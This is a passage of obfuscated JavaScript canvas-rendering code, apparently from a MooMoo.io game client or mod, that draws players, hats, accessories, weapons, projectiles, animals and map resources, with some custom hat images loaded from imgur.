  _0x556743.beginPath();
  _0x556743.quadraticCurveTo((_0x24ce8e + _0xf28c90) / 2 + _0x3534 * Math.cos(_0x131775 + Math.PI / 2), (_0x15652b + _0x1cc4f8) / 2 + _0x3534 * Math.sin(_0x131775 + Math.PI / 2), _0xf28c90, _0x1cc4f8);
  _0x556743.quadraticCurveTo((_0x24ce8e + _0xf28c90) / 2 - _0x3534 * Math.cos(_0x131775 + Math.PI / 2), (_0x15652b + _0x1cc4f8) / 2 - _0x3534 * Math.sin(_0x131775 + Math.PI / 2), _0x24ce8e, _0x15652b);
  _0x556743.closePath();
  _0x556743.fill();
  _0x556743.stroke();
}
function renderCircle(_0x3c6deb, _0x3fea5b, _0x464505, _0x4b2bb8, _0x149d0c, _0x49da45) {
  _0x4b2bb8 = _0x4b2bb8 || mainContext;
  _0x4b2bb8.beginPath();
  _0x4b2bb8.arc(_0x3c6deb, _0x3fea5b, _0x464505, 0, Math.PI * 2);
  if (!_0x49da45) {
    _0x4b2bb8.fill();
  }
  if (!_0x149d0c) {
    _0x4b2bb8.stroke();
  }
}
function renderHealthCircle(_0x4a00de, _0x654d8f, _0x2058a4, _0x317eea, _0x4752e4, _0x27a8b1) {
  _0x317eea = _0x317eea || mainContext;
  _0x317eea.beginPath();
  _0x317eea.arc(_0x4a00de, _0x654d8f, _0x2058a4, 0, Math.PI * 2);
  if (!_0x27a8b1) {
    _0x317eea.fill();
  }
  if (!_0x4752e4) {
    _0x317eea.stroke();
  }
}
function renderStar(_0x3f1966, _0x163574, _0x1282a5, _0x4300f9) {
  let _0x2969f7 = Math.PI / 2 * 3;
  let _0x1dd8c4;
  let _0x3e4244;
  let _0x587cf1 = Math.PI / _0x163574;
  _0x3f1966.beginPath();
  _0x3f1966.moveTo(0, -_0x1282a5);
  for (let _0x527d9d = 0; _0x527d9d < _0x163574; _0x527d9d++) {
    _0x1dd8c4 = Math.cos(_0x2969f7) * _0x1282a5;
    _0x3e4244 = Math.sin(_0x2969f7) * _0x1282a5;
    _0x3f1966.lineTo(_0x1dd8c4, _0x3e4244);
    _0x2969f7 += _0x587cf1;
    _0x1dd8c4 = Math.cos(_0x2969f7) * _0x4300f9;
    _0x3e4244 = Math.sin(_0x2969f7) * _0x4300f9;
    _0x3f1966.lineTo(_0x1dd8c4, _0x3e4244);
    _0x2969f7 += _0x587cf1;
  }
  _0x3f1966.lineTo(0, -_0x1282a5);
  _0x3f1966.closePath();
}
function renderHealthStar(_0x4c7714, _0x2bd8aa, _0x2e4c34, _0x44fabf) {
  let _0x371026 = Math.PI / 2 * 3;
  let _0x2dd36c;
  let _0x425069;
  let _0x595221 = Math.PI / _0x2bd8aa;
  _0x4c7714.beginPath();
  _0x4c7714.moveTo(0, -_0x2e4c34);
  for (let _0x3a4335 = 0; _0x3a4335 < _0x2bd8aa; _0x3a4335++) {
    _0x2dd36c = Math.cos(_0x371026) * _0x2e4c34;
    _0x425069 = Math.sin(_0x371026) * _0x2e4c34;
    _0x4c7714.lineTo(_0x2dd36c, _0x425069);
    _0x371026 += _0x595221;
    _0x2dd36c = Math.cos(_0x371026) * _0x44fabf;
    _0x425069 = Math.sin(_0x371026) * _0x44fabf;
    _0x4c7714.lineTo(_0x2dd36c, _0x425069);
    _0x371026 += _0x595221;
  }
  _0x4c7714.lineTo(0, -_0x2e4c34);
  _0x4c7714.closePath();
}
function renderRect(_0xe5c8d5, _0x3c6f84, _0x3ff048, _0x5add4a, _0x1a191f, _0x2d87f5, _0x52497f) {
  if (!_0x52497f) {
    _0x1a191f.fillRect(_0xe5c8d5 - _0x3ff048 / 2, _0x3c6f84 - _0x5add4a / 2, _0x3ff048, _0x5add4a);
  }
  if (!_0x2d87f5) {
    _0x1a191f.strokeRect(_0xe5c8d5 - _0x3ff048 / 2, _0x3c6f84 - _0x5add4a / 2, _0x3ff048, _0x5add4a);
  }
}
function renderHealthRect(_0x42ada5, _0xff171f, _0x2a7089, _0xc6a104, _0x337760, _0xaa6896, _0x53ad37) {
  if (!_0x53ad37) {
    _0x337760.fillRect(_0x42ada5 - _0x2a7089 / 2, _0xff171f - _0xc6a104 / 2, _0x2a7089, _0xc6a104);
  }
  if (!_0xaa6896) {
    _0x337760.strokeRect(_0x42ada5 - _0x2a7089 / 2, _0xff171f - _0xc6a104 / 2, _0x2a7089, _0xc6a104);
  }
}
function renderRectCircle(_0x1d8be1, _0x12d5bd, _0x2c92ff, _0x2054ce, _0x4d507e, _0x1d7434, _0x550b95, _0x48233c) {
  _0x1d7434.save();
  _0x1d7434.translate(_0x1d8be1, _0x12d5bd);
  _0x4d507e = Math.ceil(_0x4d507e / 2);
  for (let _0x1609bc = 0; _0x1609bc < _0x4d507e; _0x1609bc++) {
    renderRect(0, 0, _0x2c92ff * 2, _0x2054ce, _0x1d7434, _0x550b95, _0x48233c);
    _0x1d7434.rotate(Math.PI / _0x4d507e);
  }
  _0x1d7434.restore();
}
function renderBlob(_0x23a2b5, _0x3050bf, _0x28a70d, _0x14dd03) {
  let _0x559606 = Math.PI / 2 * 3;
  let _0x2e9f6f;
  let _0xce01c;
  let _0x4be7a5 = Math.PI / _0x3050bf;
  let _0x2d340c;
  _0x23a2b5.beginPath();
  _0x23a2b5.moveTo(0, -_0x14dd03);
  for (let _0x4750ba = 0; _0x4750ba < _0x3050bf; _0x4750ba++) {
    _0x2d340c = UTILS.randInt(_0x28a70d + 0.9, _0x28a70d * 1.2);
    _0x23a2b5.quadraticCurveTo(Math.cos(_0x559606 + _0x4be7a5) * _0x2d340c, Math.sin(_0x559606 + _0x4be7a5) * _0x2d340c, Math.cos(_0x559606 + _0x4be7a5 * 2) * _0x14dd03, Math.sin(_0x559606 + _0x4be7a5 * 2) * _0x14dd03);
    _0x559606 += _0x4be7a5 * 2;
  }
  _0x23a2b5.lineTo(0, -_0x14dd03);
  _0x23a2b5.closePath();
}
function renderTriangle(_0x34bfb3, _0x11b590) {
  _0x11b590 = _0x11b590 || mainContext;
  let _0x54d226 = _0x34bfb3 * (Math.sqrt(3) / 2);
  _0x11b590.beginPath();
  _0x11b590.moveTo(0, -_0x54d226 / 2);
  _0x11b590.lineTo(-_0x34bfb3 / 2, _0x54d226 / 2);
  _0x11b590.lineTo(_0x34bfb3 / 2, _0x54d226 / 2);
  _0x11b590.lineTo(0, -_0x54d226 / 2);
  _0x11b590.fill();
  _0x11b590.closePath();
}
function prepareMenuBackground() {}
const speed = 1;
function renderDeadPlayers(_0x5c431a, _0x29d5e6) {
  mainContext.fillStyle = "#91b2db";
  const _0x3dae36 = Date.now();
  deadPlayers.filter(_0x2afd18 => _0x2afd18.active).forEach(_0x324c84 => {
    if (!_0x324c84.startTime) {
      _0x324c84.startTime = _0x3dae36;
      _0x324c84.angle = 0;
      _0x324c84.radius = 0.1;
    }
    const _0x70e7b2 = _0x3dae36 - _0x324c84.startTime;
    const _0x44dffd = 1;
    _0x324c84.alpha = Math.max(0, _0x44dffd - _0x70e7b2 / 3000);
    _0x324c84.animate(delta);
    mainContext.globalAlpha = _0x324c84.alpha;
    mainContext.strokeStyle = outlineColor;
    mainContext.save();
    mainContext.translate(_0x324c84.x - _0x5c431a, _0x324c84.y - _0x29d5e6);
    _0x324c84.radius -= 0.001;
    _0x324c84.angle += 0.0174533;
    const _0x1efb67 = 1;
    const _0x9abdea = _0x324c84.radius * Math.cos(_0x324c84.angle);
    const _0x21c407 = _0x324c84.radius * Math.sin(_0x324c84.angle);
    _0x324c84.x += _0x9abdea * _0x1efb67;
    _0x324c84.y += _0x21c407 * _0x1efb67;
    mainContext.rotate(_0x324c84.angle);
    renderDeadPlayer(_0x324c84, mainContext);
    mainContext.restore();
    mainContext.fillStyle = "#91b2db";
    if (_0x70e7b2 >= 3000) {
      _0x324c84.active = false;
      _0x324c84.startTime = null;
    }
  });
}
function renderPlayers(_0x323add, _0x49465e, _0x303358) {
  mainContext.globalAlpha = 1;
  mainContext.fillStyle = "#91b2db";
  for (var _0x1ce465 = 0; _0x1ce465 < players.length; ++_0x1ce465) {
    tmpObj = players[_0x1ce465];
    if (tmpObj.zIndex == _0x303358) {
      tmpObj.animate(delta);
      if (tmpObj.visible) {
        tmpObj.skinRot += delta * 0.002;
        tmpDir = tmpObj == player ? getVisualDir() : tmpObj.dir || 0;
        mainContext.save();
        mainContext.translate(tmpObj.x - _0x323add, tmpObj.y - _0x49465e);
        mainContext.rotate(tmpDir + tmpObj.dirPlus);
        renderPlayer(tmpObj, mainContext);
        mainContext.restore();
      }
    }
  }
}
function renderDeadPlayer(_0x4d4722, _0xdd2dd6) {
  _0xdd2dd6 = _0xdd2dd6 || mainContext;
  _0xdd2dd6.lineWidth = outlineWidth;
  _0xdd2dd6.lineJoin = "miter";
  let _0x194737 = Math.PI / 4 * (items.weapons[_0x4d4722.weaponIndex].armS || 1);
  let _0x47d940 = _0x4d4722.buildIndex < 0 ? items.weapons[_0x4d4722.weaponIndex].hndS || 1 : 1;
  let _0x514cd0 = _0x4d4722.buildIndex < 0 ? items.weapons[_0x4d4722.weaponIndex].hndD || 1 : 1;
  renderTail2(13, _0xdd2dd6, _0x4d4722);
  if (_0x4d4722.buildIndex < 0 && !items.weapons[_0x4d4722.weaponIndex].aboveHand) {
    renderTool(items.weapons[_0x4d4722.weaponIndex], config.weaponVariants[_0x4d4722.weaponVariant || 0].src || "", _0x4d4722.scale, 0, _0xdd2dd6);
    if (items.weapons[_0x4d4722.weaponIndex].projectile != undefined && !items.weapons[_0x4d4722.weaponIndex].hideProjectile) {
      renderProjectile(_0x4d4722.scale, 0, items.projectiles[items.weapons[_0x4d4722.weaponIndex].projectile], mainContext);
    }
  }
  _0xdd2dd6.fillStyle = "#ececec";
  renderCircle(_0x4d4722.scale * Math.cos(_0x194737), _0x4d4722.scale * Math.sin(_0x194737), 14);
  renderCircle(_0x4d4722.scale * _0x514cd0 * Math.cos(-_0x194737 * _0x47d940), _0x4d4722.scale * _0x514cd0 * Math.sin(-_0x194737 * _0x47d940), 14);
  if (_0x4d4722.buildIndex < 0 && items.weapons[_0x4d4722.weaponIndex].aboveHand) {
    renderTool(items.weapons[_0x4d4722.weaponIndex], config.weaponVariants[_0x4d4722.weaponVariant || 0].src || "", _0x4d4722.scale, 0, _0xdd2dd6);
    if (items.weapons[_0x4d4722.weaponIndex].projectile != undefined && !items.weapons[_0x4d4722.weaponIndex].hideProjectile) {
      renderProjectile(_0x4d4722.scale, 0, items.projectiles[items.weapons[_0x4d4722.weaponIndex].projectile], mainContext);
    }
  }
  if (_0x4d4722.buildIndex >= 0) {
    var _0x40e797 = getItemSprite(items.list[_0x4d4722.buildIndex]);
    _0xdd2dd6.drawImage(_0x40e797, _0x4d4722.scale - items.list[_0x4d4722.buildIndex].holdOffset, -_0x40e797.width / 2);
  }
  renderCircle(0, 0, _0x4d4722.scale, _0xdd2dd6);
  renderSkin2(48, _0xdd2dd6, null, _0x4d4722);
}
function renderPlayer(_0x5bb7dd, _0x4f898f) {
  _0x4f898f = _0x4f898f || mainContext;
  _0x4f898f.lineWidth = outlineWidth;
  _0x4f898f.lineJoin = "miter";
  let _0x3900db = Math.PI / 4 * (items.weapons[_0x5bb7dd.weaponIndex].armS || 1);
  let _0x58accf = _0x5bb7dd.buildIndex < 0 ? items.weapons[_0x5bb7dd.weaponIndex].hndS || 1 : 1;
  let _0x3a8a58 = _0x5bb7dd.buildIndex < 0 ? items.weapons[_0x5bb7dd.weaponIndex].hndD || 1 : 1;
  let _0x427ee8 = _0x5bb7dd == player && _0x5bb7dd.weapons[0] == 3 && _0x5bb7dd.weapons[1] == 15;
  if (_0x5bb7dd.tailIndex > 0) {
    renderTailTextureImage(_0x5bb7dd.tailIndex, _0x4f898f, _0x5bb7dd);
  }
  if (_0x5bb7dd.buildIndex < 0 && !items.weapons[_0x5bb7dd.weaponIndex].aboveHand) {
    renderTool(items.weapons[_0x427ee8 ? 4 : _0x5bb7dd.weaponIndex], config.weaponVariants[_0x5bb7dd.weaponVariant].src, _0x5bb7dd.scale, 0, _0x4f898f);
    if (items.weapons[_0x5bb7dd.weaponIndex].projectile != undefined && !items.weapons[_0x5bb7dd.weaponIndex].hideProjectile) {
      renderProjectile(_0x5bb7dd.scale, 0, items.projectiles[items.weapons[_0x5bb7dd.weaponIndex].projectile], mainContext);
    }
  }
  _0x4f898f.fillStyle = config.skinColors[_0x5bb7dd.skinColor];
  renderCircle(_0x5bb7dd.scale * Math.cos(_0x3900db), _0x5bb7dd.scale * Math.sin(_0x3900db), 14);
  renderCircle(_0x5bb7dd.scale * _0x3a8a58 * Math.cos(-_0x3900db * _0x58accf), _0x5bb7dd.scale * _0x3a8a58 * Math.sin(-_0x3900db * _0x58accf), 14);
  if (_0x5bb7dd.buildIndex < 0 && items.weapons[_0x5bb7dd.weaponIndex].aboveHand) {
    renderTool(items.weapons[_0x5bb7dd.weaponIndex], config.weaponVariants[_0x5bb7dd.weaponVariant].src, _0x5bb7dd.scale, 0, _0x4f898f);
    if (items.weapons[_0x5bb7dd.weaponIndex].projectile != undefined && !items.weapons[_0x5bb7dd.weaponIndex].hideProjectile) {
      renderProjectile(_0x5bb7dd.scale, 0, items.projectiles[items.weapons[_0x5bb7dd.weaponIndex].projectile], mainContext);
    }
  }
  if (_0x5bb7dd.buildIndex >= 0) {
    var _0x3e5f6d = getItemSprite(items.list[_0x5bb7dd.buildIndex]);
    _0x4f898f.drawImage(_0x3e5f6d, _0x5bb7dd.scale - items.list[_0x5bb7dd.buildIndex].holdOffset, -_0x3e5f6d.width / 2);
  }
  renderCircle(0, 0, _0x5bb7dd.scale, _0x4f898f);
  if (_0x5bb7dd.skinIndex > 0) {
    _0x4f898f.rotate(Math.PI / 2);
    renderTextureSkin(_0x5bb7dd.skinIndex, _0x4f898f, null, _0x5bb7dd);
  }
}
var skinSprites2 = {};
var skinPointers2 = {};
function renderSkin2(_0x250815, _0x128b3d, _0x209dab, _0x14251a) {
  tmpSkin = skinSprites2[_0x250815];
  if (!tmpSkin) {
    var _0x210057 = new Image();
    _0x210057.onload = function () {
      this.isLoaded = true;
      this.onload = null;
    };
    _0x210057.src = "https://moomoo.io/img/hats/hat_" + _0x250815 + ".png";
    skinSprites2[_0x250815] = _0x210057;
    tmpSkin = _0x210057;
  }
  var _0x2b2baa = _0x209dab || skinPointers2[_0x250815];
  if (!_0x2b2baa) {
    for (var _0x4733f5 = 0; _0x4733f5 < hats.length; ++_0x4733f5) {
      if (hats[_0x4733f5].id == _0x250815) {
        _0x2b2baa = hats[_0x4733f5];
        break;
      }
    }
    skinPointers2[_0x250815] = _0x2b2baa;
  }
  if (tmpSkin.isLoaded) {
    _0x128b3d.drawImage(tmpSkin, -_0x2b2baa.scale / 2, -_0x2b2baa.scale / 2, _0x2b2baa.scale, _0x2b2baa.scale);
  }
  if (!_0x209dab && _0x2b2baa.topSprite) {
    _0x128b3d.save();
    _0x128b3d.rotate(_0x14251a.skinRot);
    renderSkin2(_0x250815 + "_top", _0x128b3d, _0x2b2baa, _0x14251a);
    _0x128b3d.restore();
  }
}
function renderTextureSkin(_0x5cb222, _0xb23cb, _0x43b1ed, _0x380188) {
  if (!(tmpSkin = skinSprites[_0x5cb222 + (txt ? "lol" : 0)])) {
    var _0x10bbe8 = new Image();
    _0x10bbe8.onload = function () {
      this.isLoaded = true;
      this.onload = null;
    };
    _0x10bbe8.src = setSkinTextureImage(_0x5cb222, "hat", _0x5cb222);
    skinSprites[_0x5cb222 + (txt ? "lol" : 0)] = _0x10bbe8;
    tmpSkin = _0x10bbe8;
  }
  var _0x318c80 = _0x43b1ed || skinPointers[_0x5cb222];
  if (!_0x318c80) {
    for (var _0x19b833 = 0; _0x19b833 < hats.length; ++_0x19b833) {
      if (hats[_0x19b833].id == _0x5cb222) {
        _0x318c80 = hats[_0x19b833];
        break;
      }
    }
    skinPointers[_0x5cb222] = _0x318c80;
  }
  if (tmpSkin.isLoaded) {
    _0xb23cb.drawImage(tmpSkin, -_0x318c80.scale / 2, -_0x318c80.scale / 2, _0x318c80.scale, _0x318c80.scale);
  }
  if (!_0x43b1ed && _0x318c80.topSprite) {
    _0xb23cb.save();
    _0xb23cb.rotate(_0x380188.skinRot);
    renderSkin(_0x5cb222 + "_top", _0xb23cb, _0x318c80, _0x380188);
    _0xb23cb.restore();
  }
}
var FlareZHat = {
  7: "https://i.imgur.com/vAOzlyY.png",
  15: "https://i.imgur.com/YRQ8Ybq.png",
  40: "https://i.imgur.com/Xzmg27N.png",
  26: "https://i.imgur.com/I0xGtyZ.png",
  55: "https://i.imgur.com/uYgDtcZ.png",
  20: "https://i.imgur.com/f5uhWCk.png"
};
function setSkinTextureImage(_0xf1f42, _0x740e4a, _0x1049e5) {
  if (true) {
    if (FlareZHat[_0xf1f42] && _0x740e4a == "hat") {
      return FlareZHat[_0xf1f42];
    } else if (_0x740e4a == "acc") {
      return ".././img/accessories/access_" + _0xf1f42 + ".png";
    } else if (_0x740e4a == "hat") {
      return ".././img/hats/hat_" + _0xf1f42 + ".png";
    } else {
      return ".././img/weapons/" + _0xf1f42 + ".png";
    }
  } else if (_0x740e4a == "acc") {
    return ".././img/accessories/access_" + _0xf1f42 + ".png";
  } else if (_0x740e4a == "hat") {
    return ".././img/hats/hat_" + _0xf1f42 + ".png";
  } else {
    return ".././img/weapons/" + _0xf1f42 + ".png";
  }
}
let skinSprites = {};
let skinPointers = {};
let tmpSkin;
function renderSkin(_0x52cbb9, _0x3be066, _0x553f43, _0x13524a) {
  tmpSkin = skinSprites[_0x52cbb9];
  if (!tmpSkin) {
    let _0x29e04f = new Image();
    _0x29e04f.onload = function () {
      this.isLoaded = true;
      this.onload = null;
    };
    _0x29e04f.src = "https://moomoo.io/img/hats/hat_" + _0x52cbb9 + ".png";
    skinSprites[_0x52cbb9] = _0x29e04f;
    tmpSkin = _0x29e04f;
  }
  let _0x44ef9e = _0x553f43 || skinPointers[_0x52cbb9];
  if (!_0x44ef9e) {
    for (let _0x375d29 = 0; _0x375d29 < hats.length; ++_0x375d29) {
      if (hats[_0x375d29].id == _0x52cbb9) {
        _0x44ef9e = hats[_0x375d29];
        break;
      }
    }
    skinPointers[_0x52cbb9] = _0x44ef9e;
  }
  if (tmpSkin.isLoaded) {
    _0x3be066.drawImage(tmpSkin, -_0x44ef9e.scale / 2, -_0x44ef9e.scale / 2, _0x44ef9e.scale, _0x44ef9e.scale);
  }
  if (!_0x553f43 && _0x44ef9e.topSprite) {
    _0x3be066.save();
    _0x3be066.rotate(_0x13524a.skinRot);
    renderSkin(_0x52cbb9 + "_top", _0x3be066, _0x44ef9e, _0x13524a);
    _0x3be066.restore();
  }
}
var FlareZAcc = {
  21: "https://i.imgur.com/4ddZert.png",
  19: "https://i.imgur.com/sULkUZT.png"
};
function setTailTextureImage(_0x27805d, _0x45130c, _0x2a53b8) {
  if (true) {
    if (FlareZAcc[_0x27805d] && _0x45130c == "acc") {
      return FlareZAcc[_0x27805d];
    } else if (_0x45130c == "acc") {
      return ".././img/accessories/access_" + _0x27805d + ".png";
    } else if (_0x45130c == "hat") {
      return ".././img/hats/hat_" + _0x27805d + ".png";
    } else {
      return ".././img/weapons/" + _0x27805d + ".png";
    }
  } else if (_0x45130c == "acc") {
    return ".././img/accessories/access_" + _0x27805d + ".png";
  } else if (_0x45130c == "hat") {
    return ".././img/hats/hat_" + _0x27805d + ".png";
  } else {
    return ".././img/weapons/" + _0x27805d + ".png";
  }
}
function renderTailTextureImage(_0x2a93f9, _0xcdfebc, _0x81d039) {
  if (!(tmpSkin = accessSprites[_0x2a93f9 + (txt ? "lol" : 0)])) {
    var _0xefa5dc = new Image();
    _0xefa5dc.onload = function () {
      this.isLoaded = true;
      this.onload = null;
    };
    _0xefa5dc.src = setTailTextureImage(_0x2a93f9, "acc");
    accessSprites[_0x2a93f9 + (txt ? "lol" : 0)] = _0xefa5dc;
    tmpSkin = _0xefa5dc;
  }
  var _0x10d25a = accessPointers[_0x2a93f9];
  if (!_0x10d25a) {
    for (var _0x5d4a12 = 0; _0x5d4a12 < accessories.length; ++_0x5d4a12) {
      if (accessories[_0x5d4a12].id == _0x2a93f9) {
        _0x10d25a = accessories[_0x5d4a12];
        break;
      }
    }
    accessPointers[_0x2a93f9] = _0x10d25a;
  }
  if (tmpSkin.isLoaded) {
    _0xcdfebc.save();
    _0xcdfebc.translate(-20 - (_0x10d25a.xOff || 0), 0);
    if (_0x10d25a.spin) {
      _0xcdfebc.rotate(_0x81d039.skinRot);
    }
    _0xcdfebc.drawImage(tmpSkin, -(_0x10d25a.scale / 2), -(_0x10d25a.scale / 2), _0x10d25a.scale, _0x10d25a.scale);
    _0xcdfebc.restore();
  }
}
let accessSprites = {};
let accessPointers = {};
var txt = true;
function renderTail(_0x437705, _0x2da744, _0x483485) {
  tmpSkin = accessSprites[_0x437705];
  if (!tmpSkin) {
    let _0x26f8c0 = new Image();
    _0x26f8c0.onload = function () {
      this.isLoaded = true;
      this.onload = null;
    };
    _0x26f8c0.src = "https://moomoo.io/img/accessories/access_" + _0x437705 + ".png";
    accessSprites[_0x437705] = _0x26f8c0;
    tmpSkin = _0x26f8c0;
  }
  let _0x3fedb7 = accessPointers[_0x437705];
  if (!_0x3fedb7) {
    for (let _0x248d18 = 0; _0x248d18 < accessories.length; ++_0x248d18) {
      if (accessories[_0x248d18].id == _0x437705) {
        _0x3fedb7 = accessories[_0x248d18];
        break;
      }
    }
    accessPointers[_0x437705] = _0x3fedb7;
  }
  if (tmpSkin.isLoaded) {
    _0x2da744.save();
    _0x2da744.translate(-20 - (_0x3fedb7.xOff || 0), 0);
    if (_0x3fedb7.spin) {
      _0x2da744.rotate(_0x483485.skinRot);
    }
    _0x2da744.drawImage(tmpSkin, -(_0x3fedb7.scale / 2), -(_0x3fedb7.scale / 2), _0x3fedb7.scale, _0x3fedb7.scale);
    _0x2da744.restore();
  }
}
var accessSprites2 = {};
var accessPointers2 = {};
function renderTail2(_0x2db98d, _0x30fccc, _0x474bea) {
  tmpSkin = accessSprites2[_0x2db98d];
  if (!tmpSkin) {
    var _0x2fcee1 = new Image();
    _0x2fcee1.onload = function () {
      this.isLoaded = true;
      this.onload = null;
    };
    _0x2fcee1.src = "https://moomoo.io/img/accessories/access_" + _0x2db98d + ".png";
    accessSprites2[_0x2db98d] = _0x2fcee1;
    tmpSkin = _0x2fcee1;
  }
  var _0x2abeb2 = accessPointers2[_0x2db98d];
  if (!_0x2abeb2) {
    for (var _0x4716b4 = 0; _0x4716b4 < accessories.length; ++_0x4716b4) {
      if (accessories[_0x4716b4].id == _0x2db98d) {
        _0x2abeb2 = accessories[_0x4716b4];
        break;
      }
    }
    accessPointers2[_0x2db98d] = _0x2abeb2;
  }
  if (tmpSkin.isLoaded) {
    _0x30fccc.save();
    _0x30fccc.translate(-20 - (_0x2abeb2.xOff || 0), 0);
    if (_0x2abeb2.spin) {
      _0x30fccc.rotate(_0x474bea.skinRot);
    }
    _0x30fccc.drawImage(tmpSkin, -(_0x2abeb2.scale / 2), -(_0x2abeb2.scale / 2), _0x2abeb2.scale, _0x2abeb2.scale);
    _0x30fccc.restore();
  }
}
let toolSprites = {};
function renderTool(_0x25ad13, _0xc53253, _0x3504bb, _0x17da23, _0x23673a) {
  let _0x14b262 = _0x25ad13.src + (_0xc53253 || "");
  let _0x6c56eb = toolSprites[_0x14b262];
  if (!_0x6c56eb) {
    _0x6c56eb = new Image();
    _0x6c56eb.onload = function () {
      this.isLoaded = true;
    };
    _0x6c56eb.src = "https://moomoo.io/img/weapons/" + _0x14b262 + ".png";
    toolSprites[_0x14b262] = _0x6c56eb;
  }
  if (_0x6c56eb.isLoaded) {
    _0x23673a.drawImage(_0x6c56eb, _0x3504bb + _0x25ad13.xOff - _0x25ad13.length / 2, _0x17da23 + _0x25ad13.yOff - _0x25ad13.width / 2, _0x25ad13.length, _0x25ad13.width);
  }
}
function renderProjectiles(_0x2327c8, _0x3ba426, _0x6e89d8) {
  for (let _0xc53ad5 = 0; _0xc53ad5 < projectiles.length; _0xc53ad5++) {
    tmpObj = projectiles[_0xc53ad5];
    if (tmpObj.active && tmpObj.layer == _0x2327c8 && tmpObj.inWindow) {
      tmpObj.update(delta);
      if (tmpObj.active && isOnScreen(tmpObj.x - _0x3ba426, tmpObj.y - _0x6e89d8, tmpObj.scale)) {
        mainContext.save();
        mainContext.translate(tmpObj.x - _0x3ba426, tmpObj.y - _0x6e89d8);
        mainContext.rotate(tmpObj.dir);
        renderProjectile(0, 0, tmpObj, mainContext, 1);
        mainContext.restore();
      }
    }
  }
  ;
}
let projectileSprites = {};
function renderProjectile(_0x2fafe6, _0x379509, _0x57a379, _0x3fd4b7, _0x2a32d7) {
  if (_0x57a379.src) {
    let _0x5a8e3f = items.projectiles[_0x57a379.indx].src;
    let _0x3eedb1 = projectileSprites[_0x5a8e3f];
    if (!_0x3eedb1) {
      _0x3eedb1 = new Image();
      _0x3eedb1.onload = function () {
        this.isLoaded = true;
      };
      _0x3eedb1.src = "https://moomoo.io/img/weapons/" + _0x5a8e3f + ".png";
      projectileSprites[_0x5a8e3f] = _0x3eedb1;
    }
    if (_0x3eedb1.isLoaded) {
      _0x3fd4b7.drawImage(_0x3eedb1, _0x2fafe6 - _0x57a379.scale / 2, _0x379509 - _0x57a379.scale / 2, _0x57a379.scale, _0x57a379.scale);
    }
  } else if (_0x57a379.indx == 1) {
    _0x3fd4b7.fillStyle = "#939393";
    renderCircle(_0x2fafe6, _0x379509, _0x57a379.scale, _0x3fd4b7);
  }
}
let aiSprites = {};
function renderAI(_0x20680c, _0x30f4c1) {
  let _0x2fd108 = _0x20680c.index;
  let _0x113fb3 = aiSprites[_0x2fd108];
  if (!_0x113fb3) {
    let _0x136dcb = new Image();
    _0x136dcb.onload = function () {
      this.isLoaded = true;
      this.onload = null;
    };
    _0x136dcb.src = "https://moomoo.io/img/animals/" + _0x20680c.src + ".png";
    _0x113fb3 = _0x136dcb;
    aiSprites[_0x2fd108] = _0x113fb3;
  }
  if (_0x113fb3.isLoaded) {
    let _0x417538 = _0x20680c.scale * 1.2 * (_0x20680c.spriteMlt || 1);
    _0x30f4c1.drawImage(_0x113fb3, -_0x417538, -_0x417538, _0x417538 * 2, _0x417538 * 2);
  }
}
function renderWaterBodies(_0x571fc1, _0x511d57, _0x192e8b, _0x29fcd8) {
  let _0x456a73 = config.riverWidth + _0x29fcd8;
  let _0x42e86c = config.mapScale / 2 - _0x511d57 - _0x456a73 / 2;
  if (_0x42e86c < maxScreenHeight && _0x42e86c + _0x456a73 > 0) {
    _0x192e8b.fillRect(0, _0x42e86c, maxScreenWidth, _0x456a73);
  }
}
let gameObjectSprites = {};
function getResSprite(_0x54575e) {
  let _0x401995 = _0x54575e.y >= config.mapScale - config.snowBiomeTop ? 2 : _0x54575e.y <= config.snowBiomeTop ? 1 : 0;
  let _0x5ecf6e = _0x54575e.type + "_" + _0x54575e.scale + "_" + _0x401995;
  let _0xc83f19 = gameObjectSprites[_0x5ecf6e];
  if (!_0xc83f19) {
    let _0x47b951 = 6;
    let _0x5ebadc = document.createElement("canvas");
    _0x5ebadc.width = _0x5ebadc.height = _0x54575e.scale * 2.1 + outlineWidth;
    let _0x1ad37b = _0x5ebadc.getContext("2d");
    _0x1ad37b.translate(_0x5ebadc.width / 2, _0x5ebadc.height / 2);
    _0x1ad37b.rotate(UTILS.randFloat(0, Math.PI));
    _0x1ad37b.strokeStyle = outlineColor;
    _0x1ad37b.lineWidth = outlineWidth;
    if (_0x54575e.type == 0) {
      let _0x4121aa;
      let _0x12f1e2 = 8;
      _0x1ad37b.globalAlpha = cdf(_0x54575e, player) <= 250 ? 0.6 : 1;
      for (let _0x4c660f = 0; _0x4c660f < 2; ++_0x4c660f) {
        _0x4121aa = tmpObj.scale * (!_0x4c660f ? 1 : 0.5);
        renderStar(_0x1ad37b, _0x12f1e2, _0x4121aa, _0x4121aa * 0.7);
        _0x1ad37b.fillStyle = !_0x401995 ? !_0x4c660f ? "#9ebf57" : "#b4db62" : !_0x4c660f ? "#e3f1f4" : "#fff";
        _0x1ad37b.fill();
        if (!_0x4c660f) {
          _0x1ad37b.stroke();
          _0x1ad37b.shadowBlur = null;
          _0x1ad37b.shadowColor = null;
          _0x1ad37b.globalAlpha = 1;
        }
      }
    } else if (_0x54575e.type == 1) {
      if (_0x401995 == 2) {
        _0x1ad37b.fillStyle = "#606060";
        renderStar(_0x1ad37b, 6, _0x54575e.scale * 0.3, _0x54575e.scale * 0.71);
        _0x1ad37b.fill();
        _0x1ad37b.stroke();
        _0x1ad37b.fillStyle = "#89a54c";
        renderCircle(0, 0, _0x54575e.scale * 0.55, _0x1ad37b);
        _0x1ad37b.fillStyle = "#a5c65b";
        renderCircle(0, 0, _0x54575e.scale * 0.3, _0x1ad37b, true);
      } else {
        renderBlob(_0x1ad37b, 6, tmpObj.scale, tmpObj.scale * 0.7);
        _0x1ad37b.fillStyle = _0x401995 ? "#e3f1f4" : "#89a54c";
        _0x1ad37b.fill();
        _0x1ad37b.stroke();
        _0x1ad37b.fillStyle = _0x401995 ? "#6a64af" : "#c15555";
        let _0x535341;
        let _0x362bbb = 4;
        let _0x3ecff0 = Math.PI * 2 / _0x362bbb;
        for (let _0x5ecda8 = 0; _0x5ecda8 < _0x362bbb; ++_0x5ecda8) {
          _0x535341 = UTILS.randInt(tmpObj.scale / 3.5, tmpObj.scale / 2.3);
          renderCircle(_0x535341 * Math.cos(_0x3ecff0 * _0x5ecda8), _0x535341 * Math.sin(_0x3ecff0 * _0x5ecda8), UTILS.randInt(10, 12), _0x1ad37b);
        }
      }
    } else if (_0x54575e.type == 2 || _0x54575e.type == 3) {
